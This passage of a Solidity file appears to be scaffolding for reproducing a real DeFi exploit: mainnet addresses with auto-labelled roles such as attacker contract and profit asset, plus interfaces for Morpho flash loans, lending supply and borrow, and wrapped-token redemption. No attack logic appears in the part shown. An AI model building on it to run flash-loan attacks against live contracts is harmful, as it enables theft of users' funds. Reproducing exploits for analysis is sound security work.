    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant attack_child = 0xA65a2F97044f4398200E02Ff9C88351cb7cC1500; // Addresses.attack_child = 0xa65a2f97044f4398200e02ff9c88351cb7cc1500 label=attack_child roles=attacker_callback_contract|attacker_contract|code_contract|contract|attack_child_contract|economic_holder|localized_contract|observed_address|profit_holder|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant eUSDC = 0xa66C648965781a67cae928fECdD413b32E081E38; // Addresses.eUSDC = 0xa66c648965781a67cae928fecdd413b32e081e38 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=eUSDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant QQQx = 0xa753A7395cAe905Cd615Da0B82A53E0560f250af; // Addresses.QQQx = 0xa753a7395cae905cd615da0b82a53e0560f250af label=BackedTokenProxy token_symbol=QQQx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MSTRx = 0xAE2f842EF90C0d5213259Ab82639D5BBF649b08E; // Addresses.MSTRx = 0xae2f842ef90c0d5213259ab82639d5bbf649b08e label=BackedTokenProxy token_symbol=MSTRx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_AFA37B_F8EE = 0xAfA37bbF68d33Bcb35A55Ea01E299e2d2DE0f8Ee; // Addresses.A_AFA37B_F8EE = 0xafa37bbf68d33bcb35a55ea01e299e2d2de0f8ee label=unresolved roles=sender source=unresolved confidence=low
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb; // Addresses.Morpho = 0xbbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb label=Morpho roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant NVDAx = 0xc845b2894dBddd03858fd2D643B4eF725fE0849d; // Addresses.NVDAx = 0xc845b2894dbddd03858fd2d643b4ef725fe0849d label=BackedTokenProxy token_symbol=NVDAx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant wSPYx = 0xc88FcD8B874fDb3256E8B55b3decB8c24EAb4c02; // Addresses.wSPYx = 0xc88fcd8b874fdb3256e8b55b3decb8c24eab4c02 label=WrappedBackedTokenProxy token_symbol=wSPYx roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant A_CB542F_39E6 = 0xcB542FD60fB03C9De4242566e323ec3A706139e6; // Addresses.A_CB542F_39E6 = 0xcb542fd60fb03c9de4242566e323ec3a706139e6 label=unresolved roles=sender source=unresolved confidence=low
    address internal constant BTI = 0xd865Ce1B07540b5edE20e8298f48da69770Fe22e; // Addresses.BTI = 0xd865ce1b07540b5ede20e8298f48da69770fe22e label=BackedAutoFeeTokenImplementation token_symbol=BTI roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant wQQQx = 0xdbD9232fee15351068Fe02F0683146e16D9f2cEa; // Addresses.wQQQx = 0xdbd9232fee15351068fe02f0683146e16d9f2cea label=WrappedBackedTokenProxy token_symbol=wQQQx roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant variableDebtwSPYx = 0xdD51785d7016d452B7C28d51b2Ce260A0f64f3E1; // Addresses.variableDebtwSPYx = 0xdd51785d7016d452b7c28d51b2ce260a0f64f3e1 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtwSPYx roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant variableDebtwMSTRx = 0xe8add97F1f6900F419deFAaa629fE13BF49d8ae4; // Addresses.variableDebtwMSTRx = 0xe8add97f1f6900f419defaaa629fe13bf49d8ae4 label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=variableDebtwMSTRx roles=asset|contract|economic_asset|profit_asset|token_related source=etherscan_v2 confidence=high
    address internal constant GOOGLx = 0xe92f673Ca36C5E2Efd2DE7628f815f84807e803F; // Addresses.GOOGLx = 0xe92f673ca36c5e2efd2de7628f815f84807e803f label=BackedTokenProxy token_symbol=GOOGLx roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_E97B09 =
        0xE97b0920b5d4e358E4564FBB4d40aACAd9cf3392; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_E97B09 = 0xe97b0920b5d4e358e4564fbb4d40aacad9cf3392 label=InitializableImmutableAdminUpgradeabilityProxy roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_FC5EFD_9F6B = 0xFc5eFD77A45C89471386f6FaBE2c6e9940189f6B; // Addresses.A_FC5EFD_9F6B = 0xfc5efd77a45c89471386f6fabe2c6e9940189f6b label=unresolved roles=code_contract|storage_contract source=unresolved confidence=low
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=observed_address source=unresolved confidence=low
}

interface IContract_3EEEB3_FAA6 {
    function borrow(address, uint256, uint256, uint16, address) external;
    function supply(address, uint256, address, uint16) external;
}

interface IMorpho {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IMorphoFlashChild {
    function execute(bytes calldata) external;
}

interface IwGOOGLx {
    function redeem(uint256, address, address) external returns (uint256);
}

library Harness {
    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
